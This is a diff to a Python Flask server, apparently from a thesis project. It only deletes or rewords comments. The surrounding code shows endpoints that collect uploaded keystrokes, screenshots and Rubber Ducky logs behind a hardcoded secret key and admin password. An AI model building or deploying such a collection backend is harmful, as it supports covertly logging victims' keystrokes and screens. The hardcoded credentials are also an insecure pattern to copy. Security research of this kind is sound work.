@@ -5,7 +5,7 @@ import os
 import logging
 from datetime import datetime
 
-# Set up logging
+
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
@@ -16,10 +16,10 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 auth = HTTPBasicAuth()
 
-# Secret key for API authentication
+# Api Authentication_Secret Key
 SECRET_KEY = "supersecretkey123"
 
-# Database models
+
 class Keystroke(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     timestamp = db.Column(db.String(20), nullable=False)
@@ -37,7 +37,7 @@ class DuckyLog(db.Model):
     status = db.Column(db.String(10), nullable=False)
     output = db.Column(db.Text)
 
-# Authentication for web interface
+# Authentication for website..
 users = {
     "admin": "thesis2023"
 }
@@ -46,14 +46,14 @@ users = {
 def verify_password(username, password):
     return username in users and users[username] == password
 
-# Check secret key for API requests
+
 def check_secret_key():
     if request.headers.get('X-Secret-Key') != SECRET_KEY:
         logger.error("Unauthorized access attempt")
         return jsonify({"error": "Unauthorized access"}), 401
     return None
 
-# API endpoints
+
 @app.route('/upload/keystrokes', methods=['POST'])
 def upload_keystrokes():
     error = check_secret_key()
@@ -89,7 +89,7 @@ def upload_screenshot():
         filename = f"screenshot_{timestamp}.png"
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         file.save(filepath)
-        # Store relative path for static serving
+        
         db_filepath = os.path.join('screenshots', filename).replace('\\', '/')
         new_screenshot = Screenshot(timestamp=timestamp, filepath=db_filepath)
         db.session.add(new_screenshot)
@@ -123,7 +123,7 @@ def upload_ducky():
         logger.error(f"Error uploading ducky log: {e}")
         return jsonify({"error": str(e)}), 500
 
-# Dashboard route
+
 @app.route('/')
 @auth.login_required
 def dashboard():
